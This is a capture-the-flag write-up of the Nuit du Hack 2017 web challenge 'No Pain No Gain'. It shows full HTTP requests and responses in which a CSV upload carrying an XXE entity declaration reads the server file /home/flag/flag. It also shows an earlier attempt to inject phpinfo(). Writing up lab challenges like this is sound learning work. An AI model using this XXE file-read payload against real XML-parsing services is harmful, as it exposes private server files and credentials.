# No Pain No Gain - 75
This is about web and they gave us some hints:
> Uploading a CSV file that will be processed to HTML. The purpose of this challenge is to catch the flag file. 

After uploading file many times we noticed about an error about XML

### The error abou XML
```
POST /index.php HTTP/1.1
Host: nopainnogain.quals.nuitduhack.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://nopainnogain.quals.nuitduhack.com/index.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------93153141210311
Content-Length: 414

-----------------------------93153141210311
Content-Disposition: form-data; name="file"; filename="solve.csv"
Content-Type: text/csv

<!-- Invitations -->
id,name,email
1,name1,email1@mail.com
2,name2,email2@mail.com 
3,</xmltag>phpinfo();<xmltag>,4
-----------------------------93153141210311
Content-Disposition: form-data; name="submit"

Submit Query
-----------------------------93153141210311--
```

Response
```
HTTP/1.1 200 OK
Date: Sun, 02 Apr 2017 17:12:53 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 1392
Content-Type: text/html; charset=UTF-8

<style>table, th, td {border: 1px solid black; border-collapse: collapse;} th, td {padding: 5px;text-align: left;}</style>
<center>
<table width="500" style="background-color:lemonchiffon">
<tr width="80" style="background-color: goldenrod; color: white;">
<td style="padding: 10px; border: 1px solid goldenrod;">Please upload a CSV file like this: </td>
</tr>
<tr><td style="padding: 10px; border: 1px solid goldenrod;" >
<i>
&lt;!-- Invitations --&gt;
<br>id,name,email
<br>1,name1,email1@mail.com
<br>2,name2,email2@mail.com
</i>
</td>
</tr>
</table>
</div>
<table width="500"  style="background-color:lemonchiffon">
<form action="/index.php" method="post" enctype="multipart/form-data">

<tr>
<td width="25%" style="background-color: goldenrod; color: white; padding: 10px;border: 1px solid goldenrod; ">Select file</td>
<td width="75%" style="background-color: goldenrod; color: white; padding: 10px; border: 1px solid goldenrod; ">
<input style="background-color: goldenrod; color: white; padding: 10px; border: 1px solid goldenrod; " type="file" name="file" id="file" /></td>
</tr>

<tr>
<td style="padding: 10px; border: 1px solid goldenrod; ">Submit</td>
<td style="padding: 10px; border: 1px solid goldenrod; "><input type="submit" name="submit" /></td>
</tr>

</form>
</table>
</center>

    <center><u>Could not convert the CSV to XML!<br>Please follow the example above.</center>
```

We try to include local file by using XXE

This payload solve the problem
```
POST /index.php HTTP/1.1
Host: nopainnogain.quals.nuitduhack.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://nopainnogain.quals.nuitduhack.com/index.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------93153141210311
Content-Length: 436

-----------------------------93153141210311
Content-Disposition: form-data; name="file"; filename="solve.csv"
Content-Type: text/csv

<!DOCTYPE canary [<!ENTITY xxe SYSTEM "file:///home/flag/flag" >]>  
id,name,email  
1,&xxe;,user1@user.local  
2,user2,user2@user.local  
-----------------------------93153141210311
Content-Disposition: form-data; name="submit"

Submit Query
-----------------------------93153141210311--
```

Response:
```
HTTP/1.1 200 OK
Date: Sun, 02 Apr 2017 17:11:09 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 1765
Content-Type: text/html; charset=UTF-8

<style>table, th, td {border: 1px solid black; border-collapse: collapse;} th, td {padding: 5px;text-align: left;}</style>
<center>
<table width="500" style="background-color:lemonchiffon">
<tr width="80" style="background-color: goldenrod; color: white;">
<td style="padding: 10px; border: 1px solid goldenrod;">Please upload a CSV file like this: </td>
</tr>
<tr><td style="padding: 10px; border: 1px solid goldenrod;" >
<i>
&lt;!-- Invitations --&gt;
<br>id,name,email
<br>1,name1,email1@mail.com
<br>2,name2,email2@mail.com
</i>
</td>
</tr>
</table>
</div>
<table width="500"  style="background-color:lemonchiffon">
<form action="/index.php" method="post" enctype="multipart/form-data">

<tr>
<td width="25%" style="background-color: goldenrod; color: white; padding: 10px;border: 1px solid goldenrod; ">Select file</td>
<td width="75%" style="background-color: goldenrod; color: white; padding: 10px; border: 1px solid goldenrod; ">
<input style="background-color: goldenrod; color: white; padding: 10px; border: 1px solid goldenrod; " type="file" name="file" id="file" /></td>
</tr>

<tr>
<td style="padding: 10px; border: 1px solid goldenrod; ">Submit</td>
<td style="padding: 10px; border: 1px solid goldenrod; "><input type="submit" name="submit" /></td>
</tr>

</form>
</table>
</center>

    <style>table, th, td {border: 1px solid black; border-collapse: collapse;} th, td {padding: 5px;text-align: left;}
</style><table style='width:100%'><tr><th>ID</th><th>Name</th><th>Email</th></tr><tr><td>1</td><td>NDH{U3VwZXIgTWFyaW8gQnJvcw0K44K544O844OR44O844Oe44Oq44Kq44OW44Op44K244O844K6DQpTxatwxIEgTWFyaW8gQnVyYXrEgXp1DQrYs9mI2KjYsdmF2KfYsdmK2Yg=}
</td><td>user1@user.local  </td> 
</tr><tr><td>2</td><td>user2</td><td>user2@user.local  </td> 
</tr></table>

```

The flag was:
* NDH{U3VwZXIgTWFyaW8gQnJvcw0K44K544O844OR44O844Oe44Oq44Kq44OW44Op44K244O844K6DQpTxatwxIEgTWFyaW8gQnVyYXrEgXp1DQrYs9mI2KjYsdmF2KfYsdmK2Yg=}
